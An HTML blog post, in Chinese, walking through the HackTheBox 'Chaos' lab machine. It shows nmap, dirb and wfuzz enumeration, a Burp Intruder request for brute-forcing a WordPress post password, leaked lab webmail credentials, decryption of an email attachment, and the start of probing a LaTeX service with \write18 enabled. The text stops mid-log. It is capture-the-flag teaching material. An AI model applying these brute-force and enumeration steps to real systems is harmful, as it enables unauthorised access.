@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="saulGoodman">
+
+
+
+
+
+<title>HackTheBox-Chaos-CTF_解题过程 | 渗透攻击红队-专注于渗透红队攻击</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saulGoodman</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saulGoodman</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">HackTheBox-Chaos-CTF_解题过程</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">saulGoodman</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">December 9, 2019&nbsp;&nbsp;23:03:05</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/HackTheBox/">HackTheBox</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1353428173&auto=1&height=66"></iframe>
+
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/710.png" alt="图片"></p>
+<p>GameName：Chaos<br>难度：中等<br>IP：10.10.10.120<br>任务：查找user.txt和root.txt文件</p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>拿到靶机之后，还是老规矩，先<code>Nmap</code>扫描一下开放服务：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT 10.10.10.120</span><br><span class="line">-sV:探测端口及版本服务信息</span><br><span class="line">-sT：TCP扫描，因为我想扫描的准确一些</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/711.png" alt="图片"></p>
+<p>开放了两个Web端口：一个是<code>80</code>另一个是<code>10000</code>，其中还有邮件服务：<code>110</code>和<code>995</code>（POP3）、<code>143</code>和<code>993</code>（IMAP），我们先从<code>80</code>下手：</p>
+<blockquote>
+<p>访问：<a target="_blank" rel="noopener" href="http://10.10.10.120/">http://10.10.10.120/</a></p>
+</blockquote>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/712.png" alt="图片"></p>
+<p>我们先让他扫描一下目录，由于比较慢，我们先让他扫着：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://10.10.10.120</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/713.png" alt="图片"></p>
+<p>我们先来到网站上，<code>Web</code>页面上显示：<code>Direct IP not allowed</code>，翻译过来就是：不允许直接用IP。那么说明就是80端口不允许使用IP访问，我们可以把它修改成域名访问：设置<code>hosts</code>文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.120    chaos.htb</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/714.png" alt="图片"></p>
+<p>接着我们访问 <code>chaos.htb</code> 得到了一个<code>Web</code>页面：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://chaos.htb/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/715.png" alt="图片"></p>
+<p>经过初步查看，看上去表面是一个静态网页，我还是先扫扫目录和子域名吧：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/716.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[21:36:01] 200 -    5KB - /about.html</span><br><span class="line">[21:36:04] 301 -  304B  - /css  -&gt;  http://chaos.htb/css/</span><br><span class="line">[21:36:06] 301 -  304B  - /img  -&gt;  http://chaos.htb/img/</span><br><span class="line">[21:36:06] 200 -    7KB - /index.html</span><br><span class="line">[21:36:07] 301 -  311B  - /javascript  -&gt;  http://chaos.htb/javascript/</span><br><span class="line">[21:36:07] 301 -  303B  - /js  -&gt;  http://chaos.htb/js/</span><br><span class="line">[21:36:10] 403 -  297B  - /server-status</span><br><span class="line">[21:36:10] 403 -  298B  - /server-status/</span><br><span class="line">[21:36:10] 301 -  307B  - /source  -&gt;  http://chaos.htb/source/</span><br><span class="line">[21:36:10] 200 -  938B  - /source/</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wfuzz具体的可以看看这篇文章：https://cuokon.github.io/2019/08/28/wfuzz/</span><br><span class="line">wfuzz -c -z file,2.txt -H &#x27;Host: FUZZ.chaos.htb&#x27; -u http://chaos.htb --hc 404</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/717.png" alt="图片"></p>
+<p>扫描出来以后我们还得设置一下<code>hosts</code>文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/718.png" alt="图片"></p>
+<p>设置完之后访问他的三个子域发现<code>admin</code>，<code>web</code>无页面：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/719.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/720.png" alt="图片"></p>
+<p>只有 <code>webmail</code> 有一个登陆的地方：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webmail.chaos.htb</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/721.png" alt="图片"></p>
+<p>尝试了<code>弱口令</code>失败之后我决定先放放，继续信息收集~</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/722.png" alt="图片"></p>
+<p>看了看，没有什么可以利用的地方，当我一筹莫展的试试，我回到刚刚扫描<code>IP</code>目录的地方，发现了扫描结果和扫描域名的结果截然不同，上面的扫描域名结果没有<code>wp</code>这个目录，而下面扫描<code>IP</code>的结果却有一个<code>wp</code>的目录：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/723.png" alt="图片"></p>
+<p>打开来看看是一个<code>目录遍历</code>，里面有一个 <code>wordpress</code> 的目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.120/wp/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/724.png" alt="图片"></p>
+<p>进入到<code>wordpress</code>目录后呢，发现是一个由<code>wordpress</code>搭建的web网站，其中里面有一篇文章是需要<code>password</code>才能访问的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.120/wp/wordpress/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/725.png" alt="图片"></p>
+<h2 id="Wordpress-爆破密码"><a href="#Wordpress-爆破密码" class="headerlink" title="Wordpress 爆破密码"></a>Wordpress 爆破密码</h2><p>当我尝试了简单的<code>弱口令</code> admin、admin123、password、pass..后无结果，然后我点开他的页面发现了一个<code>HUMAN</code>的作者：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.120/wp/wordpress/index.php/2018/10/28/chaos/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/726.png" alt="图片"></p>
+<p>这个时候就需要用到社工了，先按照它的姓名来生成一个字典来为后面的爆破做铺垫：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/727.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/728.png" alt="图片"></p>
+<p>得到一批字典后，利用 <code>BurpSuite</code> 的 <code>Intruder</code> 模块来进行枚举爆破：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /wp/wordpress/wp-login.php?action=postpass HTTP/1.1</span><br><span class="line">Host: 10.10.10.120</span><br><span class="line">Content-Length: 33</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://10.10.10.120</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">X-Forwarded-For: 192.168.1.1</span><br><span class="line">Referer: http://10.10.10.120/wp/wordpress/index.php/2018/10/28/chaos/</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">post_password=§123456§&amp;Submit=Enter</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/729.png" alt="图片"></p>
+<p>在爆破前，需要设置一些更改，因为在 <code>wordpress</code> 里，用相同的 <code>Cookie</code> 输入一次密码，密码错误的话，你就不能再用之前的 <code>Cookie</code> 来进行尝试登录密码，不然就会爆破枚举失败：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/730.png" alt="图片"></p>
+<p>那么我们就需要设置 <code>BurpSuite</code> 在爆破时，枚举一个密码字典就重新刷新一次 <code>Cookie</code> 。来到 <code>Options</code> 参数下有一个 <code>Redirections</code>，吧 <code>On-site only</code> 和 <code>Process cookies in redirections</code> 勾选上：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/731.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/732.png" alt="图片"></p>
+<p>根据长度来判断，密码为 <code>human</code>！其实按照社工的思维，有些人设置密码会和用户名相等或者在用户名后面加几个数字符合，例如：liuwx、liuwx123、liuwx@123、liuwx123456…等等，果然不出我所料，爆破后密码和用户名一样：<code>human</code>：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/733.png" alt="图片"></p>
+<p>进入到文章页面后，里面有一个邮箱的账号跟密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Protected: chaos</span><br><span class="line">Creds for webmail :</span><br><span class="line">username – ayush</span><br><span class="line">password – jiujitsu</span><br></pre></td></tr></table></figure>
+
+<h2 id="登录邮箱"><a href="#登录邮箱" class="headerlink" title="登录邮箱"></a>登录邮箱</h2><p>因为刚刚我们得到了一个子域：<code>webmail</code>，然后我们利用刚刚得到的账号密码来进行登录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://webmail.chaos.htb</span><br><span class="line">user:ayush</span><br><span class="line">pass:jiujitsu</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/734.png" alt="图片"></p>
+<p>登陆进去之后发现有一枚邮件和两个<code>附件</code>：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/735.png" alt="图片"></p>
+<p>邮件内容是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Hii, sahay</span><br><span class="line">Check the enmsg.txt</span><br><span class="line">You are the password XD.</span><br><span class="line">Also attached the script which i used to encrypt.</span><br><span class="line">Thanks,</span><br><span class="line">Ayush</span><br></pre></td></tr></table></figure>
+
+<p>翻译过来就是：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/736.png" alt="图片"></p>
+<p>看来我得学学英文了，不然老是用 <code>Google</code> 翻译，论学好英文的重要性！</p>
+<h2 id="解密文件"><a href="#解密文件" class="headerlink" title="解密文件"></a>解密文件</h2><p>把附件下载到本地其中 <code>enim_msg.txt</code> 打开看是这样的：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/737.png" alt="图片"></p>
+<p>一段乱码？我们再来看看 <code>en.py</code> 文件：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">key, filename</span>):</span></span><br><span class="line">    chunksize = <span class="number">64</span>*<span class="number">1024</span></span><br><span class="line">    outputFile = <span class="string">&quot;en&quot;</span> + filename</span><br><span class="line">    filesize = <span class="built_in">str</span>(os.path.getsize(filename)).zfill(<span class="number">16</span>)</span><br><span class="line">    IV =Random.new().read(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, IV)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> infile:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(outputFile, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> outfile:</span><br><span class="line">            outfile.write(filesize.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            outfile.write(IV)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                chunk = infile.read(chunksize)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(chunk) == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">elif</span> <span class="built_in">len</span>(chunk) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">                    chunk += <span class="string">b&#x27; &#x27;</span> * (<span class="number">16</span> - (<span class="built_in">len</span>(chunk) % <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">                outfile.write(encryptor.encrypt(chunk))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getKey</span>(<span class="params">password</span>):</span></span><br><span class="line">            hasher = SHA256.new(password.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            <span class="keyword">return</span> hasher.digest()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/738.png" alt="图片"></p>
+<p>通过在<code>Google</code>上面，我花了大量时间了解了一些关于<code>AES</code>、<code>SHA256</code>加密解密的文章，最后在<code>Github</code>上找到了一个解密脚本：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/739.png" alt="图片"></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/bing0o/Python-Scripts/blob/master/crypto.py">https://github.com/bing0o/Python-Scripts/blob/master/crypto.py</a></p>
+</blockquote>
+<p>通过解密得到了一串 <code>Base64</code> 的密文：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAucyAtIEFzIHlvdSB0b2xkIG1lIHRvIGVuY3J5cHQgaW1wb3J0YW50IG1zZywgaSBkaWQgOikKCmh0dHA6Ly9jaGFvcy5odGIvSjAwX3cxbGxfZjFOZF9uMDdIMW45X0gzcjMKClRoYW5rcywKQXl1c2gK</span><br></pre></td></tr></table></figure>
+
+<p>通过 <code>Base64</code> 解密后，发现是一段文字，其中包含一个 <code>URL</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat base64.txt | base64 --decode</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/740.png" alt="图片"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@liuwx:~/Downloads<span class="comment"># cat base64.txt | base64 --decode</span></span><br><span class="line">Hii Sahay</span><br><span class="line"></span><br><span class="line">Please check our new service <span class="built_in">which</span> create pdf</span><br><span class="line"></span><br><span class="line">p.s - As you told me to encrypt important msg, i did :)</span><br><span class="line"></span><br><span class="line">http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3</span><br><span class="line"></span><br><span class="line">Thanks,</span><br><span class="line">Ayush</span><br></pre></td></tr></table></figure>
+
+<h2 id="LaTeX编辑器命令执行"><a href="#LaTeX编辑器命令执行" class="headerlink" title="LaTeX编辑器命令执行"></a>LaTeX编辑器命令执行</h2><p>访问： <code>http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3</code> 发现是一个创建 <code>PDF</code> 的一个页面：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/741.png" alt="图片"></p>
+<p>我提交创建<code>PDF</code>发现没什么用，然后我打开审查元素看了看源码，发现了一段<code>JavaScript</code>代码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">senddata</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> content = $(<span class="string">&quot;#content&quot;</span>).val();</span><br><span class="line">	<span class="keyword">var</span> template = $(<span class="string">&quot;#template&quot;</span>).val();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(content == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">		$(<span class="string">&quot;#output&quot;</span>).text(<span class="string">&quot;No input given!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$.ajax(&#123;</span><br><span class="line">		<span class="attr">url</span>: <span class="string">&quot;ajax.php&quot;</span>,</span><br><span class="line">		<span class="attr">data</span>: &#123;</span><br><span class="line">			<span class="string">&#x27;content&#x27;</span>:content,</span><br><span class="line">			<span class="string">&#x27;template&#x27;</span>:template</span><br><span class="line">		&#125;,</span><br><span class="line">		<span class="attr">method</span>: <span class="string">&#x27;post&#x27;</span></span><br><span class="line">	&#125;).success(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">		$(<span class="string">&quot;#output&quot;</span>).text(data)</span><br><span class="line">	&#125;).fail(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">		$(<span class="string">&quot;#output&quot;</span>).text(<span class="string">&quot;OOps, something went wrong...\n&quot;</span>+data)</span><br><span class="line">	&#125;)</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/742.png" alt="图片"></p>
+<p>通过分析<code>JS</code>代码得知：这个页面是使用<code>JavaScript</code>对<code>ajax.php</code>文件进行<code>AJAX</code>调用，我先<code>BurpSuite</code>抓个包看看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /J00_w1ll_f1Nd_n07H1n9_H3r3/ajax.php HTTP/1.1</span><br><span class="line">Host: chaos.htb</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 28</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">content=liuwx&amp;template=test1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/743.png" alt="图片"></p>
+<p>这个是它的响应包：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Mon, 09 Dec 2019 10:27:03 GMT</span><br><span class="line">Server: Apache/2.4.34 (Ubuntu)</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Length: 3405</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LOG:</span><br><span class="line">This is pdfTeX, Version 3.14159265-2.6-1.40.19 (TeX Live 2019/dev/Debian) (preloaded format=pdflatex)</span><br><span class="line"> \write18 enabled.</span><br><span class="line">entering extended mode</span><br><span class="line">(./5e12799f4d92286db03fa23075cac69e.tex</span><br><span class="line">LaTeX2e &lt;2018-04-01&gt; patch level 5</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrartcl.cls</span><br><span class="line">Document Class: scrartcl 2018/03/30 v3.25 KOMA-Script document class (article)</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrkbase.sty</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrbase.sty</span><br><span 